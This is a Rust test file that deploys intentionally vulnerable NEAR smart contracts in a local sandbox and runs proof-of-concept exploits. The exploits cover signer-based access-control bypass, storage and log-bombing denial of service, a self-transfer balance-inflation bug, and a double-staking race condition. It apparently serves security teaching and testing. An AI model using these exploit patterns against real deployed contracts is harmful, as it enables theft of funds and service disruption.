use anyhow::Ok;

// macro allowing us to convert human readable units to workspace units.
use near_sdk::{ json_types::U128, ONE_NEAR };

// macro allowing us to convert args into JSON bytes to be read by the contract.
use serde_json::json;

use workspaces::{ operations::Function, Account, Contract };

const TGAS: u64 = 1_000_000_000_000;

//Access Control Example Contracts
const ACCESS_CONTROL_CONTRACT: &[u8] = include_bytes!("../res/access_control.wasm");
const ACCESS_CONTROL_CONTRACT_EXPLOIT: &[u8] = include_bytes!(
    "../res/exploit_contract_access_control.wasm"
);

// Denial of Service Example Contracts
const DOS_CONTRACT: &[u8] = include_bytes!("../res/denial_of_service.wasm");

// Logical Bug Example Contracts
const LOGICAL_CONTRACT: &[u8] = include_bytes!("../res/logical.wasm");

// Race Condition Example Contracts
const DEPOSIT_CONTRACT: &[u8] = include_bytes!("../res/deposit_contract.wasm");
const STAKING_CONTRACT: &[u8] = include_bytes!("../res/staking.wasm");
const EXPLOIT_CONTRACT: &[u8] = include_bytes!("../res/exploit_contract_race_condition.wasm");

const DEPOSIT_AMOUNT: u128 = ONE_NEAR * 20;

//Prepares and deploys ACCESS CONTROL contracts
async fn prepare_access_control() -> anyhow::Result<(Contract, Contract, Account, Account)> {
    let worker = workspaces::sandbox().await?;
    let access_control_contract = worker.dev_deploy(ACCESS_CONTROL_CONTRACT).await?;
    let access_control_contract_exploit = worker.dev_deploy(ACCESS_CONTROL_CONTRACT_EXPLOIT).await?;

    println!("Access Control Exploit contract deployed: {}", access_control_contract_exploit.id());

    let owner = worker.dev_create_account().await?;
    let caller = worker.dev_create_account().await?;

    let _ = access_control_contract
        .call("init")
        .args_json(json!({"owner": owner.id(), "data": "Hello World", "pause_status": false}))
        .transact().await?;

    println!("Access Control contract deployed: {}", access_control_contract.id());

    Ok((access_control_contract, access_control_contract_exploit, owner, caller))
}

//Prepares and deploys DoS contracts
async fn prepare_dos() -> anyhow::Result<(Contract, Account)> {
    let worker = workspaces::sandbox().await?;
    let dos_contract = worker.dev_deploy(DOS_CONTRACT).await?;
    let owner = worker.dev_create_account().await?;
    let caller = worker.dev_create_account().await?;

    let _ = dos_contract
        .call("init")
        .args_json(json!({"owner": owner.id(), "data": "Hello World", "pause_status": false}))
        .max_gas()
        .transact().await?;

    println!("Denial of Service contract deployed: {}", dos_contract.id());

    Ok((dos_contract, caller))
}

//Prepares and deploys LOGICAL contracts
async fn prepare_logical() -> anyhow::Result<(Contract, Account, Account)> {
    let worker = workspaces::sandbox().await?;
    let logical_contract = worker.dev_deploy(LOGICAL_CONTRACT).await?;
    let caller = worker.dev_create_account().await?;
    let receiver = worker.dev_create_account().await?;

    println!("Logical contract deployed: {}", logical_contract.id());

    Ok((logical_contract, caller, receiver))
}

// Prepares and deploys RACE CONDITION contracts
async fn prepare_race_condition() -> anyhow::Result<(Contract, Contract, Contract)> {
    let worker = workspaces::sandbox().await?;
    let deposit_contract = worker.dev_deploy(DEPOSIT_CONTRACT).await?;
    let staking_contract = worker.dev_deploy(STAKING_CONTRACT).await?;
    let exploit_contract = worker.dev_deploy(EXPLOIT_CONTRACT).await?;

    println!("Exploit contract deployed: {}", exploit_contract.id().to_string());

    let _ = deposit_contract
        .call("new")
        .args_json(json!({"staking_contract": staking_contract.id(),}))
        .transact().await?;

    println!("Deposit contract deployed: {}", deposit_contract.id().to_string());

    let _ = staking_contract
        .call("new")
        .args_json(json!({"account": deposit_contract.id(),}))
        .transact().await?;

    println!("Staking contract deployed: {:#?}", staking_contract.id());

    Ok((deposit_contract, staking_contract, exploit_contract))
}

#[tokio::test]
async fn exploit_access_control() -> anyhow::Result<()> {
    let (access_control_contract, access_control_contract_exploit, owner, caller) =
        prepare_access_control().await?;

    /*****============== Incorrect #[near_bindgen] Usage Exploit ==============*****/
    // let res = caller
    //     .call(access_control_contract.id(), "pause")
    //     .transact()
    //     .await?;

    // assert!(res.is_success(), "Pause Failed: {:?}", res.failures());
    // println!("Pause Logs: {:?}", res.logs());

    // let pause_status = access_control_contract
    //     .view("get_pause_status")
    //     .await?
    //     .json::<bool>()
    //     .unwrap();

    // println!("Pause Status: {:?}", pause_status);
    // assert!(pause_status == true, "Could not pause contract");

    /*****============== Signer Account Id Exploit ==============*****/
    let res = owner
        .call(access_control_contract_exploit.id(), "exploit")
        .args_json(json!({"addr":access_control_contract.id(),"owner": caller.id()}))
        .max_gas()
        .transact().await?;

    assert!(res.clone().json::<bool>().unwrap(), "Exploit Failed: {:?}", res.failures());
    println!("Exploit Logs: {:?}", res.logs());

    let res = caller.call(access_control_contract.id(), "pub_toggle_pause").transact().await?;

    assert!(res.is_success(), "Toggle Pause Failed: {:?}", res.failures());
    println!("Toggle Pause Logs: {:?}", res.logs());

    let pause_status = access_control_contract
        .view("get_pause_status").await?
        .json::<bool>()
        .unwrap();

    println!("Pause Status: {:?}", pause_status);
    assert!(pause_status == true, "Could not pause contract");

    Ok(())
}

#[tokio::test]
async fn exploit_dos_register_user() -> anyhow::Result<()> {
    let (dos_contract, caller) = prepare_dos().await?;

    let transfer = dos_contract.as_account().transfer_near(caller.id(), ONE_NEAR * 80).await?;

    assert!(transfer.is_success(), "Transfer Failed: {:?}", transfer.failures());

    let gen = "a".repeat(60);

    for i in 1000..10000 {
        let check_balance_acc_per_iteration = caller.view_account().await.unwrap().balance;
        let check_balance_contract_per_iteration = dos_contract
            .view_account().await
            .unwrap().balance;

        let check_storage_contract_before = dos_contract
            .view_account().await
            .unwrap().storage_usage;

        let acc = format!("{}{}", gen, i);

        let res = caller
            .call(dos_contract.id(), "register_user")
            .args_json(json!({ "user": acc }))
            .transact().await?;

        assert!(res.is_success(), "Register User Failed: {:?}", res.failures());

        let check_balance_contract_after = dos_contract.view_account().await.unwrap();
        let check_balance_acc_after = caller.view_account().await.unwrap().balance;

        let spent_per_iteration = check_balance_acc_per_iteration - check_balance_acc_after;
        let spent_per_iteration_near = (spent_per_iteration as f64) / (ONE_NEAR as f64); // Attacker's cost per iteration (Deposit + Gas)

        let gained_per_iteration =
            check_balance_contract_after.balance - check_balance_contract_per_iteration;
        let gained_per_iteration_near = (gained_per_iteration as f64) / (ONE_NEAR as f64); // Contract's Gain per iteration (Caller Deposit + %30 of gas)

        let storage_contract_after = dos_contract.view_account().await.unwrap().storage_usage;
        let storage_per_call = storage_contract_after - check_storage_contract_before;
        let current_storage_cost_in_near: f64 = (storage_contract_after as f64) / 100000.0;

        // Calculates cost per adding new storage in NEAR. 100kb is ~1N
        let cost_per_storage_add_in_near: f64 = (storage_per_call as f64) / 100000.0;

        let free_balance =
            (check_balance_contract_per_iteration as f64) / (ONE_NEAR as f64) -
            (storage_contract_after as f64) / 100000.0; // Free balance of contract
        let free_balance_bytes = free_balance * 100000.0;

        // ((Free balance in NEAR * bytes) / storage written) * per iteration cost
        // => Number of iterations (Free balance worth of data) * attacker_spent_per_iteration
        // Did multiplication before division to avoid rounding errors

        let cost_of_attack =
            (free_balance_bytes * spent_per_iteration_near) / (storage_per_call as f64);

        assert!(
            cost_per_storage_add_in_near > gained_per_iteration_near,
            "Contract is not vulnerable to DOS attack"
        );

        println!(
            "Cost per storage write {cost_per_storage_add_in_near} || Attacker cost per iteration: {spent_per_iteration_near} ||Storage added: {storage_per_call}\n || Contract Storage: {storage_contract_after} || Contract Storage Cost: {current_storage_cost_in_near}|| Contract Gained Per Iteration: {gained_per_iteration_near}\n || Cost of Attack: {cost_of_attack}||Free Balance: {free_balance}\n"
        );
    }

    Ok(())
}

#[tokio::test]
async fn exploit_dos_log_bombing() -> anyhow::Result<()> {
    let (dos_contract, caller) = prepare_dos().await?;

    let gen = "a".repeat(60);

    let accounts = (1..=101).map(|i| format!("{}{}", gen, i)).collect::<Vec<String>>();

    let res = caller
        .call(dos_contract.id(), "register_batch")
        .args_json(json!({ "users": accounts }))
        .max_gas()
        .transact().await?;

    assert!(res.is_success(), "Register Batch Failed: {:?}", res.failures());

    Ok(())
}

#[tokio::test]
async fn exploit_logical_bug() -> anyhow::Result<()> {
    let (logical_bug_contract, caller, receiver) = prepare_logical().await?;

    let res = caller
        .call(logical_bug_contract.id(), "deposit_near")
        .deposit(ONE_NEAR * 40)
        .transact().await?;

    assert!(res.is_success(), "Deposit Failed: {:?}", res.failures());

    let near_balance = caller
        .call(logical_bug_contract.id(), "view_near_deposit")
        .args_json(json!({"acc": caller.id()}))
        .transact().await?
        .json::<U128>()
        .unwrap();

    assert_eq!(near_balance.0, ONE_NEAR * 40);
    println!("Sender Balance Before Transfer: {}", near_balance.0);

    let res = receiver
        .call(logical_bug_contract.id(), "deposit_near")
        .deposit(ONE_NEAR * 20)
        .transact().await?;

    assert!(res.is_success(), "Deposit Failed: {:?}", res.failures());

    let near_balance = caller
        .call(logical_bug_contract.id(), "view_near_deposit")
        .args_json(json!({"acc": receiver.id()}))
        .transact().await?
        .json::<U128>()
        .unwrap();

    assert_eq!(near_balance.0, ONE_NEAR * 20);
    println!("Receiver Balance Before Transfer: {}", near_balance.0);

    /* ============= NOT MALICIOUS TRANSFER ============= */

    let res = caller
        .call(logical_bug_contract.id(), "transfer_near")
        .args_json(json!({"receiver": receiver.id(), "amount": U128(ONE_NEAR * 20)}))
        .transact().await?;

    assert!(res.is_success(), "Transfer Failed: {:?}", res.failures());

    let near_balance = receiver
        .call(logical_bug_contract.id(), "view_near_deposit")
        .args_json(json!({"acc": receiver.id()}))
        .transact().await?
        .json::<U128>()
        .unwrap();

    assert_eq!(near_balance.0, ONE_NEAR * 40);

    println!("Receiver Balance After Transfer: {}", near_balance.0);

    let near_balance = caller
        .call(logical_bug_contract.id(), "view_near_deposit")
        .args_json(json!({"acc": caller.id()}))
        .transact().await?
        .json::<U128>()
        .unwrap();

    assert_eq!(near_balance.0, ONE_NEAR * 20);

    println!("Sender Balance After Legit Transfer/Before Exploit: {}\n", near_balance.0);

    /* ============= MALICIOUS TRANSFER ============= */

    println!("==================EXECUTING EXPLOIT ==================\n");

    let res = caller
        .call(logical_bug_contract.id(), "transfer_near")
        .args_json(json!({"receiver": caller.id(), "amount": U128(ONE_NEAR * 10)}))
        .transact().await?;

    assert!(res.is_success(), "Transfer Failed: {:?}", res.failures());

    let near_balance = caller
        .call(logical_bug_contract.id(), "view_near_deposit")
        .args_json(json!({"acc": caller.id()}))
        .transact().await?
        .json::<U128>()
        .unwrap();

    assert_eq!(near_balance.0, ONE_NEAR * 30);

    println!("Sender Balance After Exploit: {}", near_balance.0);

    Ok(())
}

#[tokio::test]
async fn exploit_race_condition() -> anyhow::Result<()> {
    let (deposit_contract, staking_contract, exploit_contract): (
        Contract,
        Contract,
        Contract,
    ) = prepare_race_condition().await?;

    //Deposit into deposit contract
    let res = exploit_contract
        .as_account()
        .call(deposit_contract.id(), "deposit_near")
        .deposit(DEPOSIT_AMOUNT)
        .transact().await?;

    assert!(res.is_success(), "Deposit Failed: {:?}", res.failures());

    println!("Deposited: {:?}", res.logs());

    // Constructing batch call ourselves

    let batch = exploit_contract
        .as_account()
        .batch(deposit_contract.id())
        .call(
            Function::new("stake")
                .args_json(
                    json!({"validator":"test.near".to_string(), "amount":U128::from(DEPOSIT_AMOUNT)})
                )
                .gas(29 * TGAS)
        )
        .call(
            Function::new("stake")
                .args_json(
                    json!({"validator":"test.near".to_string(), "amount":U128::from(DEPOSIT_AMOUNT)})
                )
                .gas(29 * TGAS)
        )
        .transact().await?;

    // Utilizing exploit contract. It stakes twice in batch transaction
    // let batch = exploit_contract
    //     .call("exploit")
    //     .args_json(json!({"addr":deposit_contract.id(),"amount": U128(DEPOSIT_AMOUNT)}))
    //     .max_gas()
    //     .transact()
    //     .await?;

    // Check if we have failures (we should)
    assert_eq!(batch.failures().is_empty(), false, "Exploit failed");

    let is_correct_failure = batch
        .failures()
        .iter()
        .any(|f| {
            let err = f.clone().clone().into_result().unwrap_err();

            err.into_inner()
                .unwrap()
                .to_string()
                .contains("Smart contract panicked: Subtract with underflow")
        });

    // Check if we have correct failure
    assert_eq!(is_correct_failure, true, "Exploit failed");

    let staked_amount = staking_contract
        .call("view_stake")
        .args_json(json!({"account":exploit_contract.id(), "validator":"test.near"}))
        .transact().await?
        .json::<U128>()
        .unwrap();

    assert_eq!(staked_amount.0, DEPOSIT_AMOUNT * 2);

    println!("Staked amount:{:?}", staked_amount);

    let exploit_contract_balance = exploit_contract.as_account().view_account().await?.balance;

    println!("Exploit contract balance before withdraw: {}\n", exploit_contract_balance);

    let res = exploit_contract
        .as_account()
        .call(staking_contract.id(), "withdraw_stake")
        .args_json(
            json!(
            {"validator":"test.near".to_string(), "amount":U128::from(DEPOSIT_AMOUNT * 2)})
        )
        .transact().await?;

    assert!(res.is_success(), "Withdraw Failed: {:?}", res.failures());
    println!("Withdrawn: {:?}", res.logs());

    let exploit_contract_balance = exploit_contract.as_account().view_account().await?.balance;

    println!("Exploit contract balance after withdraw: {}\n", exploit_contract_balance);

    let staked_amount = staking_contract
        .call("view_stake")
        .args_json(json!({"account":exploit_contract.id(), "validator":"test.near"}))
        .transact().await?
        .json::<U128>()
        .unwrap();

    assert_eq!(staked_amount.0, 0);

    println!("Staked amount:{:?}", staked_amount);

    Ok(())
}